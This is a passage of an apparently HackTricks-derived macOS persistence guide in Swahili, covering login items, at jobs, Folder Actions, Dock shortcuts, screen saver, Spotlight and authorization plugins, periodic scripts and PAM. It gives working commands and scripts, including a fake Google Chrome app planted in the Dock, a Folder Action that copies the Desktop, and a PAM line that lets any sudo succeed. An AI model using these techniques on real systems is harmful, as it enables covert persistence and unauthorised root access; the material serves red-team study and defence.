osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Vipengee hivi huhifadhiwa katika faili **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** zinaweza pia kuonyeshwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), ambayo itahifadhi usanidi katika **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP as Login Item

(Angalia sehemu iliyotangulia kuhusu Login Items; hii ni nyongeza)

Ukihifadhi faili la **ZIP** kama **Login Item**, **`Archive Utility`** italifungua, na ikiwa zip hiyo ilikuwa, kwa mfano, imehifadhiwa katika **`~/Library`** na ilikuwa na Folder **`LaunchAgents/file.plist`** yenye backdoor, folder hiyo itaundwa (haipo kwa default) na plist itaongezwa. Kwa hiyo, wakati mwingine mtumiaji atakapoingia tena, **backdoor iliyoonyeshwa kwenye plist itatekelezwa**.

Chaguo jingine lingekuwa kuunda faili **`.bash_profile`** na **`.zshenv`** ndani ya HOME ya mtumiaji, kwa hivyo ikiwa folder LaunchAgents tayari ipo, technique hii bado ingefanya kazi.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Ni muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji **kutekeleza** **`at`** na lazima iwe **enabled**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Unahitaji **kutekeleza** **`at`** na lazima iwe **enabled**

#### **Description**

Tasks za `at` zimeundwa kwa ajili ya **kupanga tasks za mara moja** zitakazotekelezwa wakati maalum. Tofauti na cron jobs, tasks za `at` huondolewa kiotomatiki baada ya kutekelezwa. Ni muhimu kutambua kwamba tasks hizi hudumu hata baada ya system reboot, jambo linalozifanya kuwa matatizo ya usalama yanayoweza kutokea chini ya hali fulani.<sup>[[16]](#references)</sup>

Kwa **default**, huwa **disabled**, lakini mtumiaji wa **root** anaweza **kuziwezesha** kwa:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Hii itaunda faili baada ya saa 1:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Kagua foleni ya kazi kwa kutumia `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Hapo juu tunaweza kuona kazi mbili zilizopangwa. Tunaweza kuchapisha maelezo ya kazi kwa kutumia `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Ikiwa AT tasks hazijawezeshwa, tasks zilizoundwa hazitatekelezwa.

**Mafaili ya kazi** yanaweza kupatikana katika `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Jina la faili lina queue, nambari ya job, na muda uliopangwa wa kuendeshwa. Kwa mfano, tuchunguze `a0001a019bdcd2`.

- `a` - hii ndiyo queue
- `0001a` - nambari ya job katika hex, `0x1a = 26`
- `019bdcd2` - muda katika hex. Inawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika decimal. Tukizidisha kwa 60 tunapata `1619509560`, ambayo ni `GMT: 2021. April 27., Tuesday 7:46:00`.

Tukichapisha faili ya job, tunapata kwamba ina taarifa zilezile tulizopata kwa kutumia `at -c`.

### Folder Actions

Maelezo: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Maelezo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kuweza kuita `osascript` ikiwa na arguments ili kuwasiliana na **`System Events`** na kuweza kusanidi Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ina baadhi ya ruhusa za msingi za TCC kama Desktop, Documents na Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root inahitajika
- **Trigger**: Ufikiaji wa folder iliyobainishwa
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Ufikiaji wa folder iliyobainishwa

#### Description & Exploitation

Folder Actions ni scripts zinazoanzishwa kiotomatiki na mabadiliko katika folder, kama vile kuongeza au kuondoa items, au actions nyingine kama kufungua au kubadilisha ukubwa wa dirisha la folder. Actions hizi zinaweza kutumika kwa tasks mbalimbali, na zinaweza kuanzishwa kwa njia tofauti, kama kutumia Finder UI au terminal commands.<sup>[[17]](#references)[[18]](#references)</sup>

Ili kusanidi Folder Actions, una chaguo kama:

1. Kuunda workflow ya Folder Action kwa kutumia [Automator](https://support.apple.com/guide/automator/welcome/mac) na kuisakinisha kama service.
2. Kuambatisha script manually kupitia Folder Actions Setup katika context menu ya folder.
3. Kutumia OSAScript kutuma Apple Event messages kwa `System Events.app` ili kusanidi Folder Action programmatically.
- Njia hii ni muhimu hasa kwa kuingiza action kwenye mfumo, na kutoa kiwango fulani cha persistence.

Script ifuatayo ni mfano wa kinachoweza kutekelezwa na Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Ili kufanya script iliyo hapo juu itumike na Folder Actions, i-compile kwa kutumia:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Baada ya script kukusanywa, sanidi Folder Actions kwa kutekeleza script iliyo hapa chini. Script hii itawezesha Folder Actions kimataifa na kuambatisha script iliyokusanywa hapo awali kwenye folda ya Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Endesha script ya setup kwa:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Hii ndiyo njia ya kutekeleza persistence hii kupitia GUI:

Hii ndiyo script itakayotekelezwa:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Icompile kwa kutumia: `osacompile -l JavaScript -o folder.scpt source.js`

Ihamishe hadi:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Kisha, fungua app ya `Folder Actions Setup`, chagua **folda unayotaka kuifuatilia** na katika hali yako chagua **`folder.scpt`** (kwangu niliiita output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sasa, ukifungua folda hiyo kwa kutumia **Finder**, script yako itatekelezwa.

Configuration hii ilihifadhiwa katika **plist** iliyoko **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** katika umbizo la base64.

Sasa, tujaribu kuandaa persistence hii bila ufikiaji wa GUI:

1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwenda `/tmp` ili kuihifadhi kama backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Ondoa** Folder Actions ulizoweka hivi punde:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sasa kwa kuwa tuna mazingira tupu

3. Copy faili ya backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Fungua Folder Actions Setup.app ili ipakie configuration hii: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Na hii haikunifanyia kazi, lakini hayo ndiyo maelekezo kutoka kwenye writeup:(

### Shortcuts za Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Ni muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kuwa umesakinisha application hasidi ndani ya mfumo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Mtumiaji anapobofya app iliyo ndani ya Dock

#### Maelezo na Exploitation

Applications zote zinazoonekana kwenye Dock zimeainishwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Inawezekana **kuongeza application** kwa kutumia tu:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Kwa kutumia **social engineering** unaweza **impersonate kwa mfano Google Chrome** ndani ya dock na kutekeleza script yako mwenyewe:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Muhimu kwa kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Kitendo maalum sana kinahitaji kutokea
- Utaishia kwenye sandbox nyingine
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/Library/ColorPickers`
- Root inahitajika
- Trigger: Tumia color picker
- `~/Library/ColorPickers`
- Trigger: Tumia color picker

#### Maelezo na Exploit

**Compile bundle ya color picker** ikiwa na code yako (unaweza kutumia [**hii kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na uongeze constructor (kama ilivyo katika [sehemu ya Screen Saver](macos-auto-start-locations.md#screen-saver)) kisha unakili bundle kwenye `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Kisha, color picker inapotriggeriwa, code yako inapaswa pia kutekelezwa.

Kumbuka kwamba binary inayopakia library yako ina **sandbox yenye vizuizi vikali sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Muhimu kwa kubypass sandbox: **Hapana, kwa sababu unahitaji ku-execute app yako mwenyewe**
- TCC bypass: ???

#### Mahali

- App maalum

#### Maelezo na Exploit

Mfano wa application yenye Finder Sync Extension [**unaweza kuupata hapa**](https://github.com/D00MFist/InSync).

Applications zinaweza kuwa na `Finder Sync Extensions`. Extension hii itawekwa ndani ya application ambayo ita-execute. Zaidi ya hayo, ili extension iweze ku-execute code yake, **lazima isainiwe** kwa kutumia Apple developer certificate halali, lazima iwe **sandboxed** (ingawa relaxed exceptions zinaweza kuongezwa), na lazima isajiliwe kwa kitu kama:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Maelezo: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Maelezo: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini utaishia kwenye sandbox ya application ya kawaida
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/System/Library/Screen Savers`
- Root inahitajika
- **Trigger**: Chagua screen saver
- `/Library/Screen Savers`
- Root inahitajika
- **Trigger**: Chagua screen saver
- `~/Library/Screen Savers`
- **Trigger**: Chagua screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Maelezo na Exploit

Create project mpya katika Xcode na uchague template ya kutengeneza **Screen Saver** mpya. Kisha, ongeza code yako, kwa mfano code ifuatayo ya kutengeneza logs.<sup>[[23]](#references)[[24]](#references)</sup>

**Build** it, kisha nakili bundle ya `.saver` kwenda **`~/Library/Screen Savers`**. Halafu, fungua Screen Saver GUI na ukibofya tu juu yake, inapaswa kutengeneza logs nyingi:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Kumbuka kwamba kwa kuwa ndani ya entitlements za binary inayopakia msimbo huu (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`**, utakuwa **ndani ya application sandbox ya kawaida**.

Msimbo wa Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini utaishia kwenye application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox inaonekana kuwa na mipaka mikubwa

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
- `/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
- New app required

#### Description & Exploitation

Spotlight ni kipengele cha utafutaji kilichojengwa ndani ya macOS, kilichoundwa kuwapa watumiaji **ufikiaji wa haraka na mpana wa data iliyo kwenye kompyuta zao**.\
Ili kuwezesha uwezo huu wa utafutaji wa haraka, Spotlight hudumisha **database ya proprietary** na huunda index kwa **kuparse mafaili mengi**, hivyo kuwezesha utafutaji wa haraka kupitia majina ya mafaili pamoja na maudhui yake.<sup>[[25]](#references)</sup>

Msingi wa utendaji wa Spotlight unahusisha process kuu inayoitwa 'mds', ambayo inamaanisha **'metadata server'.** Process hii huratibu huduma yote ya Spotlight. Kwa kuongezea, kuna daemons nyingi za 'mdworker' zinazotekeleza kazi mbalimbali za maintenance, kama vile ku-index aina tofauti za mafaili (`ps -ef | grep mdworker`). Kazi hizi huwezeshwa na Spotlight importer plugins, au **".mdimporter bundles**", ambazo huwezesha Spotlight kuelewa na ku-index maudhui katika anuwai kubwa ya formats za mafaili.

Plugins au **`.mdimporter`** bundles zinapatikana katika maeneo yaliyotajwa hapo awali, na bundle mpya ikitokea hupakiwa ndani ya dakika moja (hakuna haja ya kurestart service yoyote). Bundles hizi zinahitaji kubainisha ni **aina gani ya mafaili na extensions gani zinaweza kudhibiti**, ili Spotlight izitumie wakati faili mpya yenye extension iliyobainishwa inapoundwa.

Inawezekana **kupata `mdimporters`** zote zilizopakiwa kwa kuendesha:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** hutumika kuchanganua aina hizi za faili (viendelezi `.iba` na `.book`, miongoni mwa vingine):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Ukikagua Plist ya `mdimporter` nyingine huenda usipate ingizo **`UTTypeConformsTo`**. Hiyo ni kwa sababu ni _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) iliyojengwa ndani, na haihitaji kutaja extensions.
>
> Zaidi ya hayo, plugins za msingi za System hutangulia kila mara, kwa hiyo mshambuliaji anaweza kufikia faili ambazo hazija-indexiwa na `mdimporters` za Apple zenyewe.

Ili kuunda importer yako mwenyewe, unaweza kuanza na project hii: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), kisha ubadilishe jina, **`CFBundleDocumentTypes`**, na uongeze **`UTImportedTypeDeclarations`** ili iauni extension unayotaka ku-support, na uziakisi katika **`schema.xml`**.\
Kisha **badilisha** code ya function **`GetMetadataForFile`** ili itekeleze payload yako wakati faili yenye extension iliyochakatwa inaundwa.

Hatimaye, **build na copy `.mdimporter` yako mpya** kwenye mojawapo ya locations tatu zilizotajwa awali. Unaweza kuangalia ikiwa imepakiwa kwa **kufuatilia logs** au kuendesha **`mdimport -L`**.

### ~~Preference Pane~~

> [!CAUTION]
> Haionekani kama hii bado inafanya kazi.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Inahitaji user action maalum
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Haionekani kama hii bado inafanya kazi.<sup>[[26]](#references)</sup>

## Root Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata start locations zinazofaa kwa **sandbox bypass**, zinazokuruhusu kutekeleza kitu kwa urahisi kwa **kukiandika kwenye faili** ukiwa **root** na/au zikihitaji **hali nyingine zisizo za kawaida.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini lazima uwe root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root inahitajika
- **Trigger**: Wakati muda unapofika
- `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local`
- Root inahitajika
- **Trigger**: Wakati muda unapofika

#### Description & Exploitation

Scripts za periodic (**`/etc/periodic`**) hutekelezwa kwa sababu ya **launch daemons** zilizosanidiwa katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Kumbuka kwamba scripts zilizohifadhiwa katika `/etc/periodic/` **hutekelezwa** kama **owner wa faili,** kwa hiyo hii haitafanya kazi kwa privilege escalation inayowezekana.<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Kuna scripts nyingine za periodic zitakazotekelezwa, zilizoonyeshwa katika **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Ukifanikiwa kuandika faili yoyote kati ya `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local` **itatekelezwa mapema au baadaye**.

> [!WARNING]
> Kumbuka kwamba script ya periodic **itatekelezwa kama mmiliki wa script hiyo**. Kwa hiyo, ikiwa mtumiaji wa kawaida ndiye anayemiliki script hiyo, itatekelezwa na mtumiaji huyo (hili linaweza kuzuia mashambulizi ya privilege escalation).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Root inahitajika kila wakati

#### Description & Exploitation

Kwa kuwa PAM inalenga zaidi **persistence** na malware kuliko execution rahisi ndani ya macOS, blogu hii haitatoa maelezo ya kina, **soma writeups ili kuelewa vizuri zaidi technique hii**.<sup>[[28]](#references)</sup>

Kagua modules za PAM kwa kutumia:
```bash
ls -l /etc/pam.d
```
Mbinu ya persistence/privilege escalation inayotumia vibaya PAM ni rahisi kama kurekebisha module /etc/pam.d/sudo kwa kuongeza mwanzoni mstari:
```bash
auth       sufficient     pam_permit.so
```
Kwa hiyo **itaonekana kama** kitu kama hiki:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Na hivyo basi jaribio lolote la kutumia **`sudo` litafanya kazi**.

> [!CAUTION]
> Kumbuka kwamba directory hii inalindwa na TCC, kwa hivyo kuna uwezekano mkubwa mtumiaji ataonyeshwa prompt ya kuomba ruhusa ya kufikia.

Mfano mwingine mzuri ni su, ambapo unaweza kuona kwamba pia inawezekana kuzipa PAM modules parameters (na unaweza pia kuweka backdoor kwenye file hii):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na kufanya mipangilio ya ziada
- TCC bypass: ???

#### Mahali

- `/Library/Security/SecurityAgentPlugins/`
- Root inahitajika
- Pia inahitajika kusanidi authorization database ili itumie plugin

#### Maelezo na Exploitation

Unaweza kuunda authorization plugin ambayo itatekelezwa mtumiaji anapoingia ili kudumisha persistence. Kwa maelezo zaidi kuhusu jinsi ya kuunda mojawapo ya plugins hizi, angalia writeup zilizotangulia (na uwe mwangalifu, plugin iliyoandikwa vibaya inaweza kukufungia nje, na utahitaji kusafisha Mac yako ukiwa kwenye recovery mode).<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
